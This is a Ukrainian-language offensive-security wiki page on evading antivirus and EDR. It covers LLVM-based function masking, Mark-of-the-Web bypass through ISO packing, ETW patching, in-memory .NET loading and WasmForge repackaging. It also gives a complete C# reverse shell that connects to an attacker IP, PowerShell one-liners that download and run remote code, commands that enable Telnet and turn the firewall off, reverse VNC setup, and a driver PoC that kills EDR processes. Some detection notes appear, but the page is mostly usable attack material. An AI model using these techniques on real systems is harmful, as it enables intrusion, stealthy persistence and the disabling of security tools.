Замість того щоб маскувати весь implant лише під час сну, модифікований бекенд LLVM X86 може зберігати вибрані функції в XOR-маскованому вигляді, коли вони неактивні. PoC Function Peekaboo вибирає демангльовані назви, що містять `REG_`, додає позиційно-незалежні заглушки входу/виходу навколо кінцевого машинного коду та розміщує один спільний обробник маскування в `.text`; сигнатури на рівні джерельного коду й угода про виклики Windows x64 залишаються незмінними.<sup>[[38]](#references)[[39]](#references)</sup>

#### Перетворення потоку керування в бекенді

Це слід робити після вибору інструкцій та оптимізації, оскільки перетворення має охоплювати **кожну згенеровану інструкцію повернення** й знати точне розташування x86-коду. `MachineFunctionPass`, що виконується перед генерацією, знаходить останній `MachineInstr::isReturn()`, видаляє його, щоб фінальний шлях переходив до доданого епілогу, а попередні інструкції повернення замінює на `JMP_1 handler`. Залишайте згенероване компілятором звільнення стека/кадру перед кожною інструкцією повернення; перенаправляйте лише саму інструкцію повернення.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` і `X86AsmPrinter::emitFunctionBodyEnd()` генерують заглушки для кожної функції, а `emitEndOfAsmFile()` генерує обробник. Символи, спільні для етапів генерації, дають змогу переходу в прологу вказувати на пізніше згенерований епілог; для ручної генерації ближнього `je` запишіть `0F 84`, а за ним — чотирибайтовий вираз MC `target - address_after_je`. Виклики й переходи до обробника натомість можна генерувати як об’єкти `MCInst` (`CALL64pcrel32` і `JMP_1`). Якщо функція не вибрана й змін не було, pass має повертати `false`; у PoC на цьому шляху помилково повертається `true`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Метадані та ініціалізація до CRT

PoC розміщує XOR-ключ і записи розміром 16 байтів, що містять покажчик на функцію з loader-релокацією та довжину, визначену під час виконання, у `.funcmeta`. Хоча поле C має тип `uint32_t`, обробник читає QWORD за зміщенням `+8` у записі, захоплюючи довжину та її доповнення, а записи проходить із кроком `0x10`. Назви секцій PE займають лише вісім байтів, тому під час виконання пошук знаходить `.funcmet`. Зовнішній patcher додає виконувану секцію `.stub`, зберігає старий RVA точки входу в заглушці та перенаправляє `AddressOfEntryPoint`; PIC-заглушка отримує базу образу через `gs:[0x60]` → `[PEB+0x10]`, проходить імпорти PE32+, щоб знайти вже імпортовану `VirtualProtect`, і виконується до CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Ініціалізація встановлює sentinel у `gs:[0xE8]` і викликає кожну функцію з метаданих. Її постійно доступний для читання пролог записує початок функції в `gs:[0xF0]`, виявляє sentinel і пропускає тіло, яке ще не замасковане. Потім епілог використовує `call handler`; після того як обробник зберігає 13 регістрів (`0x68` байтів), адреса повернення в `[rsp+0x68]` є кінцем перетвореної функції, тож `end - start` можна записати в її запис метаданих. Після маскування всіх тіл заглушка очищає sentinel і переходить на `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Під час звичайного виклику пролог викликає той самий симетричний обробник, щоб декодувати тіло. Фінальний шлях переходить до доданого епілогу, тоді як кожна попередня інструкція повернення переходить безпосередньо до спільного обробника. Звичайний епілог також використовує `jmp handler`, а не `call`, тому після повторного маскування `ret` обробника споживає адресу повернення початкового виклику та зберігає результат функції в `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Примітив маскування та індикатори аналізу

Обробник знаходить поточний запис, пропускає фіксований видимий пролог (у цій збірці — `0x46` байтів), змінює захист решти на `PAGE_EXECUTE_READWRITE`, виконує XOR кожного байта з молодшим байтом ключа, а потім встановлює захист `PAGE_EXECUTE_READ`. Отже, той самий цикл декодує тіло під час входу й кодує його під час кожного звичайного виходу.<sup>[[38]](#references)[[39]](#references)</sup>

До добре помітних індикаторів цієї схеми належать:<sup>[[38]](#references)[[39]](#references)</sup>

- точка входу всередині виконуваної `.stub` і секція `.funcmet` із ключем та релокованими покажчиками на `.text`;
- розбір PEB, таблиці імпортів і таблиці секцій до CRT, після чого виконуються виклики через кожен покажчик із метаданих;
- однакові PIC-прологи `call`/`pop` і численні місця повернення, перенаправлені до одного обробника;
- записи в `gs:[0xE8]`, `gs:[0xF0]` і `gs:[0xF8]`, після яких відбуваються повторювані зміни захисту через `VirtualProtect` і побайтовий XOR у виконуваних сторінках, що належать образу.

Це ухилення від сканерів пам’яті, а не криптографічний захист: у пропатченому файлі все ще міститься початкове незашифроване тіло, а налагоджувач може зупинитися на `VirtualProtect` або циклі XOR і зберегти активну функцію. Однобайтовий XOR, доступні для читання метадані та фіксована межа `0x46` також спрощують відновлення офлайн.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Слоти TEB у PoC є локальними для потоку, але модифіковані сторінки коду спільні для всього процесу. Тому одночасний або рекурсивний вхід може повторно перемикати інструкції, поки виконується інший виклик; винятки та нелокальні виходи також можуть обійти повторне маскування. Надійна реалізація має синхронізувати переходи, відновлювати фактичний захист, повернений через `lpflOldProtect`, не використовувати жорстко задану довжину заглушки, перевіряти вирівнювання стека x64 для шляхів `call` і `jmp`, а також викликати `FlushInstructionCache` після перезапису виконуваних байтів. Microsoft прямо покладає на викликача відповідальність за узгодженість кешу інструкцій у разі модифікації виконуваного коду.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen і MoTW

Можливо, ви бачили цей екран під час завантаження деяких виконуваних файлів з інтернету та їх запуску.

Microsoft Defender SmartScreen — це механізм безпеки, призначений захищати кінцевого користувача від запуску потенційно шкідливих застосунків.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen переважно використовує підхід на основі репутації: застосунки, які завантажують нечасто, викликають попередження SmartScreen, що сповіщає кінцевого користувача й не дає запустити файл (хоча файл усе одно можна запустити, натиснувши More Info -> Run anyway).

**MoTW** (Mark of The Web) — це [Alternate Data Stream NTFS](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) із назвою Zone.Identifier, який автоматично створюється під час завантаження файлів з інтернету та містить URL-адресу, звідки їх завантажили.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Перевірка ADS Zone.Identifier для файлу, завантаженого з інтернету.</p></figcaption></figure>

> [!TIP]
> Важливо зазначити, що виконувані файли, підписані **довіреним** сертифікатом підпису, **не викликають SmartScreen**.

Дуже ефективний спосіб не допустити появи Mark of The Web на ваших payloads — упакувати їх у контейнер, наприклад ISO. Це працює, оскільки Mark-of-the-Web (MOTW) **не можна** застосувати до томів, що **не використовують NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) — інструмент, який пакує payloads у вихідні контейнери, щоб обійти Mark-of-the-Web.

Приклад використання:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Ось демонстрація обходу SmartScreen шляхом пакування payloads у файли ISO за допомогою [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) — це потужний механізм журналювання у Windows, який дає змогу програмам і системним компонентам **записувати події**. Однак його також можуть використовувати засоби безпеки для моніторингу та виявлення шкідливої активності.

Так само, як можна вимкнути (обійти) AMSI, можна змусити функцію **`EtwEventWrite`** процесу в user space негайно повертати керування, не записуючи жодних подій. Для цього функцію патчать у пам’яті, щоб вона одразу повертала керування, фактично вимикаючи журналювання ETW для цього процесу.

Більше інформації можна знайти в **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) та [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## Відображення C# Assembly

Завантаження C# binaries у пам’ять відоме вже досить давно, і це досі чудовий спосіб запускати інструменти post-exploitation, не потрапляючи на очі AV.

Оскільки payload завантажується безпосередньо в пам’ять, не торкаючись диска, нам потрібно буде подбати лише про патчинг AMSI для всього процесу.

Більшість C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc тощо) вже дають змогу виконувати C# assemblies безпосередньо в пам’яті, але для цього є різні способи:

- **Fork\&Run**

Цей метод передбачає **створення нового sacrificial process**, ін’єкцію в нього шкідливого коду post-exploitation, виконання цього коду та завершення нового процесу після завершення роботи. У цього методу є переваги й недоліки. Перевага методу fork and run полягає в тому, що виконання відбувається **поза** процесом нашого Beacon implant. Це означає, що якщо під час дій post-exploitation щось піде не так або нас виявлять, **імплант має значно більше шансів вижити**. Недолік у тому, що **ймовірність виявлення засобами поведінкового виявлення** вища.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Цей метод передбачає ін’єкцію шкідливого коду post-exploitation **у власний процес**. Так можна уникнути створення нового процесу та його сканування засобами AV, але якщо під час виконання payload щось піде не так, **ймовірність втратити beacon** буде значно вищою, оскільки він може аварійно завершитися.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Щоб дізнатися більше про завантаження C# Assembly, перегляньте цю статтю [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) і їхній InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Також можна завантажувати C# Assemblies **через PowerShell**. Перегляньте [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) і [відео від S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Перепакування інструментів .NET у WebAssembly за допомогою NativeAOT (WasmForge)

Звичайні методи `execute-assembly` зберігають впізнаваний MSIL і зрештою ініціалізують CLR. **WasmForge** змінює середовище виконання: він переносить проєкт C# на експериментальну ціль NativeAOT-LLVM WASI, компілює його заздалегідь у WebAssembly і вбудовує цей модуль у Windows PE host на базі Wazero. Отриманому процесу не потрібні CLR, JIT або host `dotnet` на цільовій системі, тому правила, що ґрунтуються лише на назвах managed assemblies, завантаженні CLR, AMSI або .NET ETW, не мають прямого доступу до нього. Це техніка ухилення від виявлення та пакування, а не обхід межі привілеїв: гостьове середовище зберігає дозволи початкового інструмента та його помітну поведінку в ОС.<sup>[[44]](#references)[[45]](#references)</sup>

### Збирання проєкту C#

Рекомендований спосіб збирання — середовище Docker проєкту, оскільки воно містить .NET 10 SDK, workload NativeAOT-LLVM, WASI SDK 24.0, linker і залежності для підписування. Файл `.csproj` визначається автоматично; одноетапне збирання виконує міграцію, патчинг сумісності, компіляцію WASM, створення PE та підписування.<sup>[[45]](#references)</sup>

```bash
# From the WasmForge repository
make docker-build
make docker-run DOCKER_SRC=/path/to/Seatbelt DOCKER_PROJECT=seatbelt

# Equivalent direct build when all prerequisites are installed
GOOS=windows GOARCH=amd64 ./wasmforge build --win32-apis \
  -o seatbelt.exe /path/to/Seatbelt/Seatbelt/
```

Для усунення проблем або перевірки згенерованого коду розділіть процес на `wasmforge dotnet-migrate <dir>`, `wasmforge dotnet-patch <dir>`, `dotnet publish -c Release -r wasi-wasm` і фінальну команду `wasmforge build --wasm <module> --nativeaot --win32-apis -o <output.exe>`. У середовищі збірки також використовується обгортка `wasm-component-ld`, щоб уникнути кодування компонентів WASI Preview 2 і створити звичайний модуль, очікуваний вбудованим середовищем виконання.<sup>[[44]](#references)[[45]](#references)</sup>

### Взаємодія між wasm32 C# і x64 Win32

Це не прозора повторна компіляція. У NativeAOT-WASI відсутні деякі функції BCL, орієнтовані на Windows, або вони працюють інакше, а гостьове середовище wasm32 зазвичай виділяє чотирибайтові слоти для вказівників, тоді як API x64 можуть повертати восьмибайтові вказівники. WasmForge розв’язує обидві проблеми за допомогою таких згенерованих шарів:<sup>[[44]](#references)</sup>

1. Патчер вихідного коду виправляє семантичні відмінності, специфічні для AOT, і перенаправляє непідтримувані виклики реєстру, каналів, WMI, ідентифікації, служб каталогів, версій файлів, LSA та подібні виклики до допоміжних функцій `Wf*`.
2. Сканер P/Invoke генерує зіставлення `DirectPInvoke` для NativeAOT, щоб виклики `[DllImport]` прив’язувалися до пов’язаних символів мосту C, а не динамічно завантажували оголошену DLL у гостьовому середовищі.
3. Для вказівників, прив’язаних до хоста, у C# використовується `ulong`, а в C — `uint64_t`. Універсальний диспетчер передає виклик обробнику Win32 на хості; `out8_mask` позначає справжні восьмибайтові вихідні слоти, старші половини яких потрібно зберегти. Для непозначених вихідних слотів формату wasm32 використовується захист зі знімком і відновленням, щоб запис x64 не пошкодив сусідні чотири байти.
4. Для операцій, які не підходять для універсальної диспетчеризації системних викликів, передбачені спеціалізовані мости хоста — наприклад, для доступу до кешу квитків LSA, операцій Kerberos/BCrypt зі структурованими результатами, трафіку TCP KDC та запитів LDAP.

Наприклад, обгортка для `version.dll!VerQueryValueW` передає чотири адреси хоста й установлює біти 2 і 3 (`0xC`), оскільки вказівник на значення та довжина є восьмибайтовими вихідними слотами. Сама обгортка залишається універсальною та передає назву DLL, назву експорту, аргументи й маску до `wf_call_v2`; хост виконує перетворення вказівників і викликає нативний API.<sup>[[44]](#references)</sup>

```c
uint32_t version_VerQueryValueW_v2(uint64_t block, uint64_t subblock,
    uint64_t value_out, uint64_t length_out) {
    return (uint32_t)wf_call_v2("version.dll", "VerQueryValueW", 4,
        0xC, block, subblock, value_out, length_out);
}
```

### Обмеження та вектори виявлення

Код із широким використанням reflection, динамічне завантаження збірок, довільні native callbacks і складні структури x64, що повертаються в пам’ять WASM, усе ще можуть потребувати окремих патчів для кожного інструмента або взагалі не працювати. Універсальні сокети WASI Preview 2 також можуть викликати заглушки no-op, тому підтримувані інструменти використовують host-shims для конкретних протоколів. Перевіряйте кожну команду на нативній збірці, а не припускайте, що функціональність однакова.<sup>[[44]](#references)[[45]](#references)</sup>

Ця техніка змінює телеметрію, а не робить payload невидимим. Виявлення може зосередитися на PE, що містить модуль WASM або створює його під час виконання, поведінці runtime на кшталт Wazero, незвичному виділенні та копіюванні пам’яті між host і guest, універсальній прямій диспетчеризації Win32, аномаліях підпису й PE-ресурсів, а також на подальших викликах API та мережевому трафіку. Тому відсутність подій завантаження CLR, AMSI або .NET ETW не слід вважати доказом нешкідливості процесу.<sup>[[44]](#references)</sup>

## Використання інших мов програмування

Як запропоновано в [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), шкідливий код можна виконувати й іншими мовами, надавши скомпрометованій машині доступ **до середовища інтерпретатора, встановленого на SMB-шарі під контролем атакувальника**.

Надавши доступ до бінарних файлів інтерпретатора й середовища на SMB-шарі, можна **виконувати довільний код цими мовами в пам’яті** скомпрометованої машини.

У репозиторії зазначено: Defender і далі сканує скрипти, але використання Go, Java, PHP тощо дає **більше гнучкості для обходу статичних сигнатур**. Тестування випадкових, не обфускованих скриптів reverse shell цими мовами виявилося успішним.

## Повторне розміщення WebAssembly для ухилення від статичного аналізу

<a id="bridging-linear-memory-to-native-apis"></a>
<a id="per-build-wasm-vm-polymorphism"></a>
<a id="camouflaging-the-outer-go-executable"></a>

{{#ref}}
virtualized-payload-execution.md#webassembly-re-hosting-for-static-analysis-evasion
{{#endref}}

## TokenStomping

Token stomping змінює access token засобу безпеки, наприклад EDR або AV. Зниження привілеїв токена може залишити процес запущеним, але не дозволити йому виконувати привілейовану перевірку чи усунення загроз.

Щоб запобігти цьому, Windows могла б **заборонити зовнішнім процесам** отримувати дескриптори токенів процесів безпеки.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Використання довіреного ПЗ

### Chrome Remote Desktop

Як описано в [**цьому дописі в блозі**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), Chrome Remote Desktop легко розгорнути на комп’ютері жертви, а потім використати для отримання над ним контролю та збереження persistence:<sup>[[35]](#references)</sup>
1. Завантажте програму з https://remotedesktop.google.com/, натисніть «Set up via SSH», а потім клацніть файл MSI для Windows, щоб завантажити його.
2. Запустіть інсталятор у тихому режимі на машині жертви (потрібні права адміністратора): `msiexec /i chromeremotedesktophost.msi /qn`
3. Поверніться на сторінку Chrome Remote Desktop і натисніть «Next». Майстер запропонує пройти авторизацію; натисніть кнопку «Authorize».
4. Виконайте надану команду з потрібними змінами: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (параметр `--pin` встановлює PIN без використання GUI).
 

## Розширене ухилення

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Ухилення — дуже складна тема: інколи потрібно враховувати багато різних джерел телеметрії в одній системі, тож у зрілих середовищах повністю уникнути виявлення практично неможливо.

У кожного середовища, з яким ви працюєте, будуть свої сильні та слабкі сторони.

Дуже раджу переглянути цю доповідь від [@ATTL4S](https://twitter.com/DaniLJ94), щоб отримати базове уявлення про розширені техніки ухилення.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Це ще одна чудова доповідь від [@mariuszbit](https://twitter.com/mariuszbit) про багаторівневе ухилення.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Старі техніки**

### **Перевірка, які частини Defender вважає шкідливими**

Можна скористатися [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), який **видаляє частини бінарного файла**, доки **не визначить, яку саме частину Defender** вважає шкідливою, а потім виділяє її для вас.\
Інший інструмент, що робить **те саме, — це** [**avred**](https://github.com/dobin/avred), який пропонує відкритий вебсервіс за адресою [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

До Windows 10 у всіх версіях Windows був **Telnet server**, який можна було встановити (від імені адміністратора), виконавши:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Зробіть так, щоб воно **запускалося** під час запуску системи, і **запустіть** його зараз:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Змінити порт telnet** (приховано) та вимкнути брандмауер:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Завантажте звідси: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (потрібні завантаження bin, а не setup)

**НА ХОСТІ**: Запустіть _**winvnc.exe**_ і налаштуйте сервер:

- Увімкніть параметр _Disable TrayIcon_
- Встановіть пароль у _VNC Password_
- Встановіть пароль у _View-Only Password_

Потім перемістіть бінарний файл _**winvnc.exe**_ і **щойно** створений файл _**UltraVNC.ini**_ на **комп’ютер-жертву**

#### **Зворотне підключення**

**Атакувальник** має **запустити на своєму** **хості** бінарний файл `vncviewer.exe -listen 5900`, щоб він був **готовий** прийняти зворотне **VNC-підключення**. Потім на **комп’ютері-жертві** запустіть службу winvnc командою `winvnc.exe -run` і виконайте `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ПОПЕРЕДЖЕННЯ:** Щоб залишатися непомітним, не робіть кілька речей:

- Не запускайте `winvnc`, якщо він уже працює, інакше з’явиться [спливаюче вікно](https://i.imgur.com/1SROTTl.png). Перевірте, чи він запущений, командою `tasklist | findstr winvnc`
- Не запускайте `winvnc` без `UltraVNC.ini` у тій самій теці, інакше відкриється [вікно конфігурації](https://i.imgur.com/rfMQWcf.png)
- Не запускайте `winvnc -h` для отримання довідки, інакше з’явиться [спливаюче вікно](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Завантажте звідси: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

Усередині GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Тепер **запустіть lister** за допомогою `msfconsole -r file.rc` і **виконайте** **xml payload** за допомогою:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Поточний Defender дуже швидко завершить процес.**

### Компілюємо власний reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Перший C# Revershell

Скомпілюйте його за допомогою:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Використовуйте це з:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# із використанням компілятора

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Автоматичне завантаження та виконання:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Список обфускаторів C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Приклад використання Python для створення інжекторів:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Інші інструменти

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Більше

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Знищення AV/EDR із простору ядра

Storm-2603 використав невелику консольну утиліту під назвою **Antivirus Terminator**, щоб вимкнути захист кінцевих точок перед запуском ransomware. Інструмент постачається з **власним вразливим, але *підписаним* драйвером** і зловживає ним для виконання привілейованих операцій у ядрі, які не можуть заблокувати навіть служби AV із Protected-Process-Light (PPL).<sup>[[12]](#references)</sup>

Основні висновки
1. **Підписаний драйвер**: файл, записаний на диск, — це `ServiceMouse.sys`, але насправді це легітимно підписаний драйвер `AToolsKrnl64.sys` із «System In-Depth Analysis Toolkit» від Antiy Labs. Оскільки драйвер має дійсний підпис Microsoft, він завантажується, навіть коли ввімкнено Driver-Signature-Enforcement (DSE).
2. **Встановлення служби**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Перший рядок реєструє драйвер як **службу ядра**, а другий запускає його, щоб `\\.\ServiceMouse` став доступним із user land.
3. **IOCTL, доступні через драйвер**
   | Код IOCTL | Можливість                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Завершити довільний процес за PID (використовується для зупинки служб Defender/EDR) |
   | `0x990000D0` | Видалити довільний файл із диска |
   | `0x990001D0` | Вивантажити драйвер і видалити службу |

   Мінімальний PoC на C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Чому це працює**: BYOVD повністю обходить захисти user-mode; код, що виконується в ядрі, може відкривати *захищені* процеси, завершувати їх або змінювати об’єкти ядра незалежно від PPL/PP, ELAM чи інших функцій hardening.

Виявлення / пом’якшення наслідків
• Увімкніть список заблокованих вразливих драйверів Microsoft (`HVCI`, `Smart App Control`), щоб Windows відмовлялася завантажувати `AToolsKrnl64.sys`.
• Відстежуйте створення нових служб *ядра* й сповіщайте, коли драйвер завантажується з каталогу, доступного для запису всім користувачам, або відсутній у списку дозволених.
